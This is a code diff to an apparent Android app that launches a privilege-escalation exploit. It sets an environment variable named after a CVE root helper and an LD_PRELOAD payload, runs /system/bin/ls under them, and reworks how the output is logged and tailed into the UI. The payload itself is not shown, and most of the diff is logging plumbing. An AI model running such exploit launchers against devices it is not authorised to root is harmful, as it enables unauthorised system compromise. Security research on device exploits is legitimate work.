@@ -319,48 +319,53 @@ class MainActivity : AppCompatActivity() {
                 val traceProc = shellExec(traceCmd)
                 readProcessOutput(traceProc, COL_DIM)
 
+                val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+                val exploitLog = "$LOG_DIR/exploit-$routeName-$ts.log"
+
                 log("---", COL_DIM)
                 log("Launching exploit via LD_PRELOAD...", COL_YELLOW)
                 log("  CVE43499_ROOT_HELPER=$rootHelper", COL_DIM)
                 log("  LD_PRELOAD=$payload", COL_DIM)
+                log("  Output saved to: $exploitLog", COL_DIM)
 
                 val exploitCmd = buildString {
                     append("export CVE43499_ROOT_HELPER=$rootHelper; ")
                     append("export LD_PRELOAD=$payload; ")
-                    append("exec /system/bin/ls 2>&1")
+                    append("exec /system/bin/ls >$exploitLog 2>&1")
                 }
+
+                val tailProc = shellExec("touch $exploitLog; tail -f $exploitLog")
+                val tailThread = Thread {
+                    try {
+                        val reader = BufferedReader(InputStreamReader(
+                            ParcelFileDescriptor.AutoCloseInputStream(tailProc.inputStream)
+                        ))
+                        var line: String?
+                        while (reader.readLine().also { line = it } != null) {
+                            log(line!!, classifyLine(line!!))
+                        }
+                    } catch (_: Exception) {}
+                }
+                tailThread.start()
+
+                Thread.sleep(100)
+
                 val proc = shellExec(exploitCmd)
 
-                val stdoutThread = Thread {
+                val drainThread = Thread {
                     try {
                         val reader = BufferedReader(InputStreamReader(
                             ParcelFileDescriptor.AutoCloseInputStream(proc.inputStream)
                         ))
-                        var line: String?
-                        while (reader.readLine().also { line = it } != null) {
-                            log(line!!, classifyLine(line!!))
-                        }
+                        while (reader.readLine() != null) {}
                     } catch (_: Exception) {}
                 }
+                drainThread.start()
 
-                val stderrThread = Thread {
-                    try {
-                        val reader = BufferedReader(InputStreamReader(
-                            ParcelFileDescriptor.AutoCloseInputStream(proc.errorStream)
-                        ))
-                        var line: String?
-                        while (reader.readLine().also { line = it } != null) {
-                            log(line!!, classifyLine(line!!))
-                        }
-                    } catch (_: Exception) {}
-                }
-
-                stdoutThread.start()
-                stderrThread.start()
-                stdoutThread.join(120_000)
-                stderrThread.join(5_000)
-
+                drainThread.join(120_000)
                 val exit = proc.waitFor()
+                Thread.sleep(500)
+                tailProc.destroy()
                 log("---", COL_DIM)
                 log("Process exited with code $exit", if (exit == 0) COL_GREEN else COL_RED)
 
